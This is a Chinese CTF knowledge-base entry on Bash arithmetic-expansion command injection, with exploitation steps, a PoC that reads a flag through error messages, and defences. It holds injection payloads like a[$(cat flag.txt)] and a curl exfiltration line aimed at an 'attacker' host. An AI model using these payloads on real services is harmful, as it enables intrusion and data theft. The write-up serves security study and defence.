---
id: binary-pwn-sandbox-escape-bash-arithmetic-expansion-command-substitution
title: Bash 算术扩展中的命令替换：a[$(cmd)] 在求值报错前执行命令并回显
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: bash-arithmetic-expansion-command-substitution
tags:
- bash
- shell
- arithmetic-expansion
- command-substitution
- ctf
- command-injection
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V168
  verified_at: '2026-11-06T10:01:53+08:00'
  notes: 已对照原文Blind Calc核对：a[$(ls)]/a[$(cat flag.txt)] 在算术错误前执行并回显、示例flag一致；未验证点：未连接远程复跑。
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-bash-arithmetic-expansion-command-substitution/
draft: false
kb_aliases:
- blind calc
- Bash 算术扩展注入
- a[$(ls)]
- 算术求值命令执行
- $(( )) 命令注入
---

## 一句话结论

当“计算器”服务把用户输入直接拼进 Bash 算术表达式（`$((...))`、`((...))`、`let`、数组下标等）时，Bash 会先执行表达式里的命令替换 `$(...)`，再尝试算术求值；即使最终因为语法错误而失败，命令已经执行，且报错信息常常把命令输出原样带回，形成盲执行/回显通道。

## 原理

- Bash 的算术扩展不是“纯数学解析器”。按 Bash 手册，`$(( expression ))` 中的表达式会先经过与双引号内相同的展开：参数/变量展开、命令替换、算术扩展等；命令替换 `$(cmd)` 在这一阶段就会 fork 执行 `cmd`。
- 之后 Bash 才把展开结果当作算术表达式解析。即使结果不是合法数字（例如 `ls` 的多行输出），解析会报 `syntax error: invalid arithmetic operator` 之类的错误，但 `cmd` 的副作用已经发生。
- 题中的 `a[$(ls)]` 利用数组下标也是算术表达式的特性：`$(ls)` 先执行，输出 `blind.sh\nflag.txt` 被塞进下标，随后报错；错误信息把两行输出带出。`a[$(cat flag.txt)]` 同理，报错信息直接包含 flag。
- 同样属于“展开先于求值”的还有 `${var/$(cmd)/replacement}`、`{$(cmd),}` 花括号展开、`<(cmd)` 进程替换等；它们都能在不直接写 `;`、`|` 的情况下触发命令执行。
- 本质：把用户输入放进“看起来只做数学”的语法位置，但该语法位置仍然允许完整的 shell 展开。

## 触发条件

- 服务端把用户输入拼接到 Bash 算术上下文中，例如 `echo $(( $input ))`、`(( $input ))`、`let "$input"`、`arr[$input]=1`、`declare -i x=$input`。
- 输入没有被严格的数字白名单校验（只过滤 `;`、`|`、`&`、反引号等常见命令分隔符也不够，因为 `$()` 在算术上下文中仍可用）。
- 命令执行的输出会通过算术错误信息、服务响应或日志回显；即使不回显，也能造成盲命令执行。
- 运行用户对目标文件有读权限。

## 利用步骤

1. 提交一个正常算式（如 `3*3`）确认服务返回计算结果；提交 `0/0` 观察错误格式，判断是否由 Bash 算术求值产生。
2. 尝试 `a[$(id)]`：若报错信息中出现 `uid=...`，说明命令替换已执行且输出被回显。
3. 读取 flag：`a[$(cat flag.txt)]`；若内容含特殊字符导致截断，可用 `a[$(base64 flag.txt)]` 或 `a[$(cat flag.txt | tr '\n' ' ')]`。
4. 需要外带时用 `a[$(curl attacker/?x=$(cat flag.txt))]`；需要盲执行时用 `a[$(touch /tmp/pwned)]`。
5. 若数组下标语法被过滤，改用 `$(($(cmd)))`、`${x/$(cmd)/}`、`{$(cmd),}` 等等价展开点。

## PoC

```bash
# 服务端伪代码（blind.sh）：
#   read -r expr
#   echo $(( $expr )) 2>&1

# 交互：
Enter math > 3*3
9

Enter math > a[$(ls)]
./blind.sh: line 3: blind.sh
flag.txt
run: syntax error: invalid arithmetic operator (error token is ".sh
flag.txt
run")

Enter math > a[$(cat flag.txt)]
./blind.sh: line 3: jail{blind-calc_9c701e8c09f6cc0edd6}: syntax error: invalid arithmetic operator (error token is "{blind-calc_9c701e8c09f6cc0edd6}")
```

```text
# 结论：命令替换在算术解析之前执行，错误信息把命令输出带回。
```

## 变体与关联

- `${var/$(cmd)/replacement}`：参数替换的 pattern 位置也先做命令替换。
- `{$(cmd),}` / `echo {$(id),}`：花括号展开阶段执行命令替换。
- `cat <(cmd)` / `echo >(cmd)`：进程替换创建 fd，命令立即执行。
- `printf -v var "$(cmd)"`、`eval`：二次解析导致命令执行。
- 关联：[[pentest-privilege-escalation-bash-arithmetic-log-injection]]（同一原语用于 root cron 日志分析脚本提权，触发点是对日志字段做 `-eq` 算术比较）；本条场景是“在线计算器/算术求值服务 + 报错回显”。
- 边界：若服务使用真正的数学库（`bc`、Python `ast`、JavaScript `Function` 之外的解析器）而不是 Bash 算术，`$()` 不会被展开；若 shell 是 `sh`/`dash` 且不支持数组下标，`a[$(cmd)]` 可能语法不同，但 `$(($(cmd)))` 等仍可尝试。

## 检测与防御

- 检测：审计所有把用户输入拼进 `$(( ))`、`(( ))`、`let`、`declare -i`、数组下标的代码；对输入中出现 `$(`、`` ` ``、`${`、`{`、`<(` 等展开符号告警；关注算术错误日志中夹带的命令输出。
- 修复：不要用 shell 做数学计算；用 `awk`/`bc`/Python 等独立进程并把输入作为参数/标准输入传递，先用严格正则 `^[0-9+\-*/%() ]+$` 校验。
- 加固：以无 flag、无网络的低权限用户运行；关闭不必要的 shell 展开（使用 `--restricted` 或自定义解析器）；错误信息统一泛化，不回显用户输入或命令输出。
